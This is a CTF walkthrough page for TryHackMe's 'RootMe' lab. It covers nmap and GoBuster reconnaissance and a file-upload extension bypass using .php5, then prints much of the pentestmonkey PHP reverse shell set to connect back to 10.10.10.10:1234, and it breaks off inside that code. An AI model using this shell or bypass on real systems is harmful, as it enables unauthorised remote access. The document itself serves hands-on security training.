@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.142.0">
+    <meta name="generator" content="Relearn 5.22.1+tip">
+    <meta name="description" content="A ctf for beginners, can you root me?">
+    <meta name="author" content="">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/walkthroughs/RootMe/rootme.png">
+  <meta name="twitter:title" content="RootMe - TryHackMe">
+  <meta name="twitter:description" content="A ctf for beginners, can you root me?"><meta property="og:url" content="http://localhost:1313/walkthroughs/rootme/">
+  <meta property="og:site_name" content="H1roBytes">
+  <meta property="og:title" content="RootMe - TryHackMe">
+  <meta property="og:description" content="A ctf for beginners, can you root me?">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="website">
+    <meta property="og:image" content="http://localhost:1313/walkthroughs/RootMe/rootme.png">
+    <title>RootMe - TryHackMe - H1roBytes</title>
+    <link href="/walkthroughs/rootme/index.xml" rel="alternate" type="application/rss+xml" title="RootMe - TryHackMe - H1roBytes">
+    <link href="/images/logo.png?1738202701" rel="icon" type="image/png">
+    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
+    <link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1738202701" rel="stylesheet">
+    <link href="/css/auto-complete.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1738202701" rel="stylesheet">
+    <link href="/css/fonts.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1738202701" rel="stylesheet">
+    <link href="/css/theme-relearn-dark.css?1738202701" rel="stylesheet" id="R-variant-style">
+    <link href="/css/variant.css?1738202701" rel="stylesheet">
+    <link href="/css/print.css?1738202701" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1738202701" rel="stylesheet">
+    <script src="/js/url.js?1738202701"></script>
+    <script src="/js/variant.js?1738202701"></script>
+    <script>
+      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
+      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
+      window.index_js_url="/index.search.js";
+      var root_url="/";
+      var baseUri=root_url.replace(/\/$/, '');
+      // translations
+      window.T_Copy_to_clipboard = 'Copy to clipboard';
+      window.T_Copied_to_clipboard = 'Copied to clipboard!';
+      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
+      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
+      window.T_Reset_view = 'Reset view';
+      window.T_View_reset = 'View reset!';
+      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
+      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
+      // some further base stuff
+      var baseUriFull='http:\/\/localhost:1313/';
+      window.variants && variants.init( [ 'relearn-dark', 'zen-dark', 'relearn-bright', 'relearn-light', 'zen-light', 'neon', 'learn', 'blue', 'green', 'red' ] );
+    </script>
+  </head>
+  <body class="mobile-support html" data-url="/walkthroughs/rootme/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar">
+        <div class="topbar-wrapper">
+          <div class="topbar-sidebar-divider"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+              <button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)">
+                <i class="fa-fw fas fa-bars"></i>
+              </button>
+            </div>
+            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)">
+                <i class="fa-fw fas fa-list-alt"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper"><nav class="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#task-1-deploy-the-machine">Task 1: Deploy the machine</a></li>
+    <li><a href="#task-2-reconnaissance">Task 2: Reconnaissance</a></li>
+    <li><a href="#task-3-getting-a-shell">Task 3: Getting a shell</a></li>
+    <li><a href="#task-4-privilege-escalation">Task 4: Privilege escalation</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <span class="topbar-breadcrumbs highlightable">
+            RootMe - TryHackMe
+          </span>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More">
+                <i class="fa-fw fas fa-ellipsis-v"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable default" tabindex="-1">
+        <div class="flex-block-wrapper">
+          <article class="default">
+            <header class="headline">
+<div class=" taxonomy-tags term-list cstyle  tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <ul>
+    <li><a class="term-link" href="/tags/ctf/index.html">Ctf</a></li>
+    <li><a class="term-link" href="/tags/tryhackme/index.html">TryHackMe</a></li>
+  </ul>
+</div>
+            </header>
+<h1 id="rootme---tryhackme">RootMe - TryHackMe</h1>
+
+<p><a href="#R-image-7a60135eb25ec759406c3d99745c41e5" class="lightbox-link"><img src="/walkthroughs/rootme/rootme.png" alt="Logo" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-7a60135eb25ec759406c3d99745c41e5"><img src="/walkthroughs/rootme/rootme.png" alt="Logo" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Date written: January 2025   <br>
+Date published:</p>
+<h2 id="introduction">Introduction</h2>
+<p>In this room, you will learn how to enumerate directories, exploit file upload vulnerabilities, craft reverse shells, and exploit SUID permissions misconfigurations.</p>
+<h2 id="task-1-deploy-the-machine">Task 1: Deploy the machine</h2>
+<p>As always the first step to a TryHackMe room is to connect to either OpenVPN or AttackBox. If you have never connected to 
+<a href="https://tryhackme.com/room/openvpn" target="_blank">OpenVPN</a> or 
+<a href="https://tryhackme.com/room/tutorial" target="_blank">AttackBox</a> before try their respective rooms to for a tutorial on how to connect to each one.</p>
+<blockquote>
+<p>Deploy the machine</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed</p>
+</blockquote>
+<h2 id="task-2-reconnaissance">Task 2: Reconnaissance</h2>
+<p>Next if you want to use the commands in the walk through with out having to type in your IP every time you can set your IP using the below export command, but make sure to change &ldquo;10.10.10.10&rdquo; to your target machine IP. After this is set most programs will take $IP as the variable you just set.</p>
+<p>If you need to use a URL you can either set the variable again or type http://$IP in the command.</p>
+<p><code>export IP=10.10.10.10</code></p>
+<p>After your connected to THM you can run an nmap scan on your host with <code>nmap $IP</code>. You only need to look at the most common 1000 ports right now so just a 
+<a href="https://nmap.org/book/man-port-specification.html" target="_blank">basic scan</a> is fine.</p>
+<p><a href="#R-image-6f9753c146a2ce78833cfcc4f488e2cd" class="lightbox-link"><img src="/walkthroughs/rootme/Task2_NMAP.png" alt="nmap scan" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-6f9753c146a2ce78833cfcc4f488e2cd"><img src="/walkthroughs/rootme/Task2_NMAP.png" alt="nmap scan" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>Scan the machine, how many ports are open?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 2</p>
+</blockquote>
+<p>After a basic NMAP scan I like to run <code>nmap -sC -sV $IP</code>. This will run the default nmap scripting engine (nse) scripts (-sC) and then check for the service version (-sV) of each port. You can also specify the ports to scan with <code>-p 22, 80</code>. This saves scan time, because you already know, out of the top 1000 ports, only 22 and 80 are open.</p>
+<p>This should also give you the answer for the next two questions.</p>
+<p><a href="#R-image-39cb2a219c02a3d94c9b02998e976637" class="lightbox-link"><img src="/walkthroughs/rootme/Task2_NMAP2.png" alt="nmap scan 2" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-39cb2a219c02a3d94c9b02998e976637"><img src="/walkthroughs/rootme/Task2_NMAP2.png" alt="nmap scan 2" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span>|   /: 
+</span></span><span style="display:flex;"><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span>|_http-title: HackIT - Home
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div><blockquote>
+<p>What version of Apache is running?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 2.4.29</p>
+</blockquote>
+<blockquote>
+<p>What service is running on port 22?</p>
+</blockquote>
+<blockquote>
+<p>Answer: ssh</p>
+</blockquote>
+<blockquote>
+<p>Find directories on the web server using the GoBuster tool.</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed</p>
+</blockquote>
+<p>The next step is to use GoBuster to find a hidden directory. If you have never used Gobuster, 
+<a href="https://hackertarget.com/gobuster-tutorial/" target="_blank">HackerTarget</a> does a great job at explaining how to use it. For this use case you can skip down to &ldquo;Gobuster DIR command&rdquo; in the tutorial, but Gobuster does a lot of great things if you have time to read the full article.</p>
+<p>If you don&rsquo;t like GoBuster another tool to use is Dirbuster. 
+<a href="https://www.youtube.com/watch?v=Hnz1d4WmD5Y" target="_blank">HackerSploit</a> has a great and quick video tutorial on how to use it.
+Dirbuster is great is you are not yet comfortable running a lot of things in the terminal, because it has a user interface.</p>
+<p>To use GoBuster I like to start with just a common word list, below I chose <code>/usr/share/dirb/wordlists/common.txt</code>. You can use a word list from 
+<a href="https://github.com/danielmiessler/SecLists" target="_blank">SecLists</a> like <code>Discovery/Web-Content/common.txt</code> as well.</p>
+<p><code>gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt</code></p>
+<p><a href="#R-image-fb9195341350b8b4635359755362f98f" class="lightbox-link"><img src="/walkthroughs/rootme/Task2_gobuster.png" alt="GoBuster" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-fb9195341350b8b4635359755362f98f"><img src="/walkthroughs/rootme/Task2_gobuster.png" alt="GoBuster" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>To use DirBuster there are a few additional setting you will need to be aware of, but first start the program by typing <code>dirbuster</code> into your terminal. First you will want to add in your target URL <code>http://10.10.196.184</code>, then specify a wordlist. I, again, <code>used usr/share/dir/wordlists/common.txt</code>
+You are only brute forcing directories for RootMe, so you want to make sure to uncheck all of the starting options except &ldquo;Brute Force Dirs&rdquo; at the bottom.
+Once all your options are set, click start.</p>
+<p><a href="#R-image-d5d2762f429640fdc0cc948e6d2e950f" class="lightbox-link"><img src="/walkthroughs/rootme/Task2_dirbuster.png" alt="DirBuster" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-d5d2762f429640fdc0cc948e6d2e950f"><img src="/walkthroughs/rootme/Task2_dirbuster.png" alt="DirBuster" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>After the scan finishes, you may need to click stop or pause to stop the scan. Once stopped you can head over to the results tab to see the directories it found.</p>
+<p><a href="#R-image-f895da7c1b069365274ad9c288d15ef3" class="lightbox-link"><img src="/walkthroughs/rootme/Task2_dirbuster2.png" alt="DirBuster" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-f895da7c1b069365274ad9c288d15ef3"><img src="/walkthroughs/rootme/Task2_dirbuster2.png" alt="DirBuster" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a>
+<a href="#R-image-0c5352c8bfe778f7358bc0c90ac27b23" class="lightbox-link"><img src="/walkthroughs/rootme/Task2_dirbuster3.png" alt="DirBuster" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-0c5352c8bfe778f7358bc0c90ac27b23"><img src="/walkthroughs/rootme/Task2_dirbuster3.png" alt="DirBuster" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Regardless of which scanning tool you chose lets take a look at the directories they found.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.196.184/css/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 616<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 311<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.196.184/js/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/panel                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.196.184/panel/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 316<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.196.184/uploads/<span style="color:#f92672">]</span></span></span></code></pre></div><p>Before navigation to the directories I like to understand what each 
+<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status" target="_blank">browser status</a> code means.</p>
+<p>403 means that page is forbidden so you know that you cannot acces any of the pages with a 403 status.
+Next is 
+<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/301" target="_blank">301</a> which is the interesting status in our case. This means that the page has moved, but what happens if you navigate to the /panel page.</p>
+<p>It should bring you to an page that allows uploads.</p>
+<blockquote>
+<p>What is the hidden directory?</p>
+</blockquote>
+<blockquote>
+<p>Answer: /panel/</p>
+</blockquote>
+<h2 id="task-3-getting-a-shell">Task 3: Getting a shell</h2>
+<p>The first thing I think of is can you upload a reverse shell? Spoiler: the answer is yes, but what file extensions does the server accept?</p>
+<p>After some trial and error I found that it accepts .sh, but nothing happened. It also would not allow .php files, but from previous experience I know there are several different php file 
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst" target="_blank">extensions</a> - .php, .php3, .php4, .php5, .php7, and .php8. With each of these you can also change their case to capitalize all or a portion of the extensions. Sometimes that will allow you to get around an extension block.</p>
+<p>After a little research and trial and error you should find that .php5 is an allowed upload. Now you can craft your shell.</p>
+<p><a href="#R-image-b03aaaabede91f53f4bff73ead1207e2" class="lightbox-link"><img src="/walkthroughs/rootme/Task3_shell.png" alt="php5" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b03aaaabede91f53f4bff73ead1207e2"><img src="/walkthroughs/rootme/Task3_shell.png" alt="php5" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>For shells I like to use 
+<a href="https://www.revshells.com/" target="_blank">Reverse Shell Generator</a>. It has a list of prebuilt reverse, blind, MSFVenom, and Hoax Shells. Once on that page, first input your personal host IP and listening port. I tend to use 1234 as my listening port, but you can choose any port you&rsquo;d like as long as it is not in use on your machine. Then scroll down or search until you <code>PHP PentestMonkey</code> download or copy and paste the shell into a file. Save the file something like shell.php5.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.10.10&#39;</span>;
+</span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1234</span>;
+</span></span><span style="display:flex;"><span>$chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>;
+</span></span><span style="display:flex;"><span>$write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>$error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uname -a; w; id; sh -i&#39;</span>;
+</span></span><span style="display:flex;"><span>$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>$debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>(<span style="color:#e6db74">&#39;pcntl_fork&#39;</span>)) {
+</span></span><span style="display:flex;"><span>	$pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcntl_fork</span>();
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ($pid <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Can&#39;t fork&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ($pid) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>);  <span style="color:#75715e">// Parent exits
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">posix_setsid</span>() <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Error: Can&#39;t setsid()&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">umask</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Open reverse connection
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port, $errno, $errstr, <span style="color:#ae81ff">30</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$sock) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$errstr</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">$errno</span><span style="color:#e6db74">)&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>),  <span style="color:#75715e">// stdin is a pipe that the child will read from
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>),  <span style="color:#75715e">// stdout is a pipe that the child will write to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)   <span style="color:#75715e">// stderr is a pipe that the child will write to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$process <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>($shell, $descriptorspec, $pipes);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_resource</span>($process)) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Can&#39;t spawn shell&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($sock, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Successfully opened reverse shell to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($sock)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell connection terminated&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($pipes[<span style="color:#ae81ff">1</span>])) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell process terminated&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	$read_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>($sock, $pipes[<span style="color:#ae81ff">1</span>], $pipes[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>	$num_changed_sockets <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_select</span>($read_a, $write_a, $error_a, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($sock, $read_a)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK READ&#34;</span>);
+</span></span><span style="display:flex;"><span>		$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($sock, $chunk_size);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
